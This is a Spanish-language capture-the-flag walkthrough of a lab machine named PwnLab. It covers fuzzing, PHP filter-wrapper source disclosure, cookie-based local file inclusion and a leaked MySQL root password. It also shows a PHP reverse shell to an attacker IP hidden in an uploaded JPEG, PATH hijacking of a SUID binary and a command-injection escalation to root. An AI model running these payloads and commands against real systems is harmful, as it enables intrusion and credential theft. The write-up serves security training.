PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
3306/tcp  open  mysql

-Cuando entras a la web tiene dos enlaces, un login y un upload, con las siguientes rutas:
	-http://192.168.1.141/?page=login
	-http://192.168.1.141/?page=upload

-Probamos LFI (Local File Inclusion) intentando ver el /etc/passwd pero no podemos

-Hacemos fuzzing al dominio principal:
	-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.141/FUZZ.php -c -fw 28
	-Rutas encontradas:
		-login.php
		-upload.php
		-config.php
		-index.php

-Si vamos a http://192.168.1.141/index.php no vemos nada

-Probamos con  'Wrappers php Filters'  para ver si podemos ver el contenido de index.php, funciona el de base64 y el de utf8-16
	-http://192.168.1.141/?page=php://filter/convert.base64-encode/resource=index	
	-http://192.168.1.141/?page=php://filter/convert.iconv.utf-8.utf-16/resource=index

-Contenido importante en index.php:
	?php
       if (isset($_COOKIE['lang']))
    {
	    include("lang/".$_COOKIE['lang']);
    }
      ?>
	<title>PwnLab Intranet Image Hosting</title>
     ?php
	  if (isset($_GET['page']))
	  {
		include($_GET['page'].".php");
	  }

-Observamos que a través de la carpta /lang , dentro de las cookies no se sanitiza bien la entrada y podemos incluir archivos locales de la máquina. Ejemplo:
	-curl -s -X GET "http://192.168.1.141/" -H "Cookie: lang=../../../../etc/passwd"
		-Respuesta: Sale el /etc/passwd

-Esto no lo podemos hacer a través del parámetro '?page' en la URL porque lo está concatenando con .php, por lo que solo podemos incluir archivos .php.

-Vemos el contenido de 'config.php' a través de php filters:
	-http://192.168.1.141/?page=php://filter/convert.base64-encode/resource=config
		$server	 = "localhost";
		$username = "root";
		$password = "H4u%QJ_H99";
		$database = "Users"; 	

-Tenemos credenciales para autenticarnos remotamente a mysql
	-mysql -uroot -pH4u%QJ_H99 -h 192.168.1.141  -P 3306 --ssl=0
	-Obtenemos usuarios y contraseñas de la tabla users:
		+------+------------------+
		| user | pass             |
		+------+------------------+
		| kent | Sld6WHVCSkpOeQ== |
		| mike | U0lmZHNURW42SQ== |
		| kane | aVN2NVltMkdSbw== |
		+------+------------------+

-Recorremos un for con Bash par decodificar las 3 contraseñas:
	-for password in Sld6WHVCSkpOeQ== U0lmZHNURW42SQ== aVN2NVltMkdSbw== ;do echo $password | base64 -d;echo;done
		JWzXuBJJNy --> kent
		SIfdsTEn6I --> mike
		iSv5Ym2GRo --> kane


-Nos autenticamos y subimos una imagen (en este caso .jpeg), introduciendo una reverse shell dentro de la imagen:
-echo "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1\''); ?>" >> >>exec.jpeg
-Contrabarras: Ponemos las '  \ ' antes de las comillas simples para que lo interprete bien

-Si vemos la últimas 2 líneas de los datos de la foto podemos ver que se ha inyectado con exito:
	-tail -n 2 exec.jpeg
	� Jf�_F��ۧ�W�?­��WZ�=TM�p[�?x��+L��0B�
	��a(��������<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1\''); ?>

-Navegando a la ruta http://192.168.1.135/upload vemos que se almacenan allí las imágenes, sin embargo no podemos ejecutarlas desde allí.


-Sabiendo que tenemos un LFI (Local File Inclusion) dentro de las cookies, vamos a ejecutar la imágen que acabamos de subir abusando del LFI:
	-curl -s -X GET "http://192.168.1.141/" -H "Cookie: lang=../upload/a7f2b44bc67bdc16e1b2707cb0ac70f6.jpeg"

## Escalada de Privilegios

-Somos el usuario www-data

-No podemos ejecutar comando como sudo ni tenemos binarios SUID interesantes.

-Cambiamos al usuario kane con las credenciales obtenidas anteriormente:
	-su kane:
	password: iSv5Ym2GRo

-Nos vamos a su directorio de trabajo en /home/kane y encontramos el siguiente archivo:
	-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike

-Vemos el contenido del archivo con 'msgmike' y vemos que ejecuta el comando 'cat' con la ruta relativa:
	-Línea dentro de msgmike: cat /home/mike/msg.txt

-Por lo tanto podemos efectuar un PATH HIJACKING para pivotar al usuario mike:
	-Vamos a /tmp y creamos un archivo 'cat' con el contenido para iniciar una shell:
		-echo '/bin/bash' > cat
		-chmod +x cat
	-Cambiamos el PATH del sistema para que empiece a buscar en /tmp:
		-export PATH=/tmp:$PATH
		-El PATH ha cambiado:
			-echo $PATH
			/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

-Ejecutamos el archivo 'msgmike':
	/home/kane/msgmike
	bash-4.3$ whoami
	mike

-Hemos pivotado al usuario 'mike', buscamos archivos y directorios con permisos SUID:
	-bash-4.3$ find / -perm /4000 2>/dev/null
	 -Archivo interesante --> /home/mike/msg2root

-Vemos su contenido:
	-strings msg2root
		Message for root: 
		/bin/echo %s >> /root/messages.txt

-Está ejecutando el comando 'echo' con la cadena que tu le pongas, sin embargo, podemos aplicar un 'Command Injection' para ejecutar el comando que queramos como root:
	-Ejecutamos el script: ./msg2root
	-Aplicamos Command Injection y le damos permisos SUID a la /bin/bash:
		Message for root: test;chmod +s /bin/bash

-Los cambios se han aplicado correctamente y podemos spawnear una shell como root:
	bash-4.3$ bash -p
	bash-4.3# whoami
	root






